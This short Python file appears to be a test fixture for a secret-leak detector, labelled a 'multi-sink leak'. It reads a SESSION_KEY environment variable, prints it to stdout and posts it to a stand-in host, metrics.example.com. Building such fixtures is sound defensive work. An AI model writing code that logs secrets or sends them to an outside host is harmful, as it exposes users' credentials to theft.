"""Leaks the session key to BOTH stdout and an outbound request (multi-sink leak)."""
import os

from __pkg__.outbound import send

key = os.environ["SESSION_KEY"]
print("active session: " + key)
send("https://metrics.example.com/report", body="session=" + key)
